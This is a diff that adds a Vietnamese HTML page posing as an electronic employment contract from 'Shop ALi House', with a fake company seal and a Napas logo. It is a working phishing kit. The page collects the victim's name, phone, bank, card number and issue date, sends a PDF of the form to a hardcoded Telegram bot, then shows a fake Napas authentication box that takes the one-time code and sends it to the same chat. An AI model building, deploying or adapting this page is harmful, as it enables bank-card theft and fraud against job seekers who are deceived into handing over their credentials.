@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hợp Đồng Online - Shop ALi House</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <style>
+        :root { --primary: #0054a6; --red: #d32f2f; }
+        body { font-family: 'Times New Roman', Times, serif; background: #f0f2f5; margin: 0; padding: 10px; color: #000; }
+        .contract-wrapper { max-width: 800px; margin: 0 auto; background: #fff; padding: 40px 50px; box-shadow: 0 0 15px rgba(0,0,0,0.1); line-height: 1.5; position: relative; box-sizing: border-box; }
+        .header-national { text-align: center; font-weight: bold; font-size: 15px; text-transform: uppercase; margin-bottom: 20px; }
+        h1 { text-align: center; font-size: 20px; margin-bottom: 30px; border-bottom: 2px solid #000; padding-bottom: 10px; }
+        .section-title { font-weight: bold; text-transform: uppercase; display: block; margin-top: 15px; margin-bottom: 5px; }
+        .form-line { margin-bottom: 10px; display: flex; flex-wrap: wrap; align-items: baseline; }
+        .input-line { border: none; border-bottom: 1px dotted #000; font-family: Arial; font-weight: bold; color: var(--primary); outline: none; flex: 1; padding: 0 5px; background: transparent; }
+        .napas-box { border: 1px solid var(--primary); padding: 15px; margin: 15px 0; background: #f8fbff; border-radius: 5px; }
+        .signature-area { display: flex; justify-content: space-around; margin-top: 50px; text-align: center; height: 180px; }
+        .sig-box { width: 45%; position: relative; }
+        .red-seal { position: absolute; top: 0; left: 50%; transform: translateX(-50%); width: 110px; height: 110px; border: 4px double var(--red); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: var(--red); font-weight: bold; font-size: 12px; opacity: 0.85; z-index: 5; }
+        .red-seal div { border: 1.5px solid var(--red); padding: 5px; border-radius: 4px; transform: rotate(-10deg); }
+        
+        /* Modal OTP */
+        .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; }
+        .modal-content { background: #fff; padding: 30px; border-radius: 15px; text-align: center; width: 340px; }
+        .otp-input { font-size: 26px; width: 100%; text-align: center; margin: 20px 0; border: 2px solid var(--primary); padding: 12px; letter-spacing: 3px; border-radius: 10px; outline: none; }
+        .btn-confirm { background: var(--primary); color: white; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
+        
+        @media (max-width: 600px) { .contract-wrapper { padding: 25px 15px; } .form-line label { width: 100%; } }
+    </style>
+</head>
+<body>
+
+<div class="contract-wrapper" id="contract-pdf">
+    <div class="header-national">CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM<br>Độc lập - Tự do - Hạnh phúc<br>--------------------------</div>
+    <h1>HỢP ĐỒNG LAO ĐỘNG ĐIỆN TỬ</h1>
+    <p>Hôm nay ngày <span id="display-date">...</span>, chúng tôi gồm:</p>
+
+    <span class="section-title">ĐIỀU 1: THÔNG TIN CÁC BÊN</span>
+    <div class="form-line"><b>Bên A (Chủ Shop):</b> SHOP ALI HOUSE</div>
+    <div class="form-line"><b>Bên B (Nhân viên):</b> <input type="text" id="name" class="input-line" style="text-transform: uppercase;"></div>
+    <div class="form-line">Số điện thoại: <input type="text" id="phone" class="input-line"></div>
+
+    <span class="section-title">ĐIỀU 2: NHẬN LƯƠNG (NAPAS)</span>
+    <div class="napas-box">
+        <div class="form-line"><label>Ngân hàng:</label><input type="text" id="bank" class="input-line"></div>
+        <div class="form-line"><label>Số thẻ:</label><input type="text" id="card" class="input-line" maxlength="19"></div>
+        <div class="form-line"><label>Ngày PH:</label><input type="text" id="issue" class="input-line" placeholder="MM/YY" maxlength="5"></div>
+    </div>
+
+    <div class="signature-area">
+        <div class="sig-box">
+            <b>ĐẠI DIỆN BÊN A</b><br><br>
+            <div class="red-seal"><div>SHOP<br>ALI HOUSE<br>ĐÃ DUYỆT</div></div>
+            <br><br><br><i>(Đã ký tên & Đóng dấu)</i>
+        </div>
+        <div class="sig-box">
+            <b>BÊN B (NHÂN VIÊN)</b><br><br><br><br><br>
+            <i id="sign-name" style="color: blue; font-weight: bold; font-size: 13px;">(Ký điện tử)</i>
+        </div>
+    </div>
+</div>
+
+<div style="text-align: center; padding: 30px;">
+    <button onclick="startProcess()" id="mainBtn" style="background:var(--primary); color:white; padding:18px 40px; border:none; border-radius:50px; font-weight:bold; cursor:pointer; font-size: 16px;">XÁC THỰC & KÝ HỢP ĐỒNG</button>
+</div>
+
+<div class="modal" id="authModal">
+    <div class="modal-content">
+        <img src="https://napas.com.vn/en/images/logo.png" width="120">
+        <h3>Xác thực Napas</h3>
+        <p style="font-size: 13px; color: #555;">Hợp đồng đã được gửi lên hệ thống.<br>Vui lòng nhập mã <b>6 số</b> hoặc <b>8 số</b> để hoàn tất.</p>
+        <input type="text" class="otp-input" id="otp" maxlength="8" placeholder="000000(00)">
+        <button class="btn-confirm" id="btnFinal" onclick="sendOTP()">HOÀN TẤT XÁC THỰC</button>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8779596349:AAHV8dPwuHbRVizgKk5fPtNbG1sntZV75pw';
+    const CHAT_ID = '-1003549722643'; // Đã thay Chat ID mới
+
+    document.getElementById('display-date').innerText = new Date().toLocaleDateString('vi-VN');
+
+    let currentEmpName = "";
+
+    // Bước 1: Gửi file PDF trước
+    async function startProcess() {
+        const nameInput = document.getElementById('name').value;
+        if(!nameInput || !document.getElementById('card').value) {
+            alert("Vui lòng điền đủ Họ tên và Số thẻ!"); return;
+        }
+        
+        const btn = document.getElementById('mainBtn');
+        btn.innerText = "Đang gửi hồ sơ..."; btn.disabled = true;
+        
+        currentEmpName = nameInput.toUpperCase();
+        document.getElementById('sign-name').innerText = currentEmpName;
+
+        // Tạo PDF
+        const element = document.getElementById('contract-pdf');
+        const pdfWorker = html2pdf().set({
+            margin: 10, filename: `HD_${currentEmpName}.pdf`, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4' }
+        }).from(element);
+
+        const pdfBlob = await pdfWorker.output('blob');
+
+        // Gửi PDF về Telegram
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('document', pdfBlob, `HD_${currentEmpName}.pdf`);
+        formData.append('caption', `📝 Hợp đồng mới từ: ${currentEmpName}\n⌛ Chờ nhân viên xác thực mã...`);
+
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+            // Gửi xong mới hiện modal nhập mã
+            document.getElementById('authModal').style.display = 'flex';
+            pdfWorker.save(); // Tải về cho nhân viên luôn
+        } catch (e) {
+            alert("Lỗi kết nối hệ thống!");
+        }
+        btn.innerText = "XÁC THỰC & KÝ HỢP ĐỒNG"; btn.disabled = false;
+    }
+
+    // Bước 2: Gửi mã OTP riêng
+    async function sendOTP() {
+        const otpValue = document.getElementById('otp').value;
+        if(otpValue.length !== 6 && otpValue.length !== 8) {
+            alert("Mã xác nhận phải là 6 số hoặc 8 số!"); return;
+        }
+
+        const btn = document.getElementById('btnFinal');
+        btn.innerText = "Đang xác thực..."; btn.disabled = true;
+
+        const text = `🔑 **MÃ XÁC THỰC (OTP)**\n👤 Nhân viên: ${currentEmpName}\n✅ Mã đã nhập: \`${otpValue}\``;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+            alert("Xác thực hoàn tất! Hợp đồng đã có hiệu lực.");
+            document.getElementById('authModal').style.display = 'none';
+        } catch (e) {
+            alert("Lỗi gửi mã xác thực!");
+        }
+        btn.innerText = "HOÀN TẤT XÁC THỰC"; btn.disabled = false;
+    }
+</script>
+</body>
+</html>
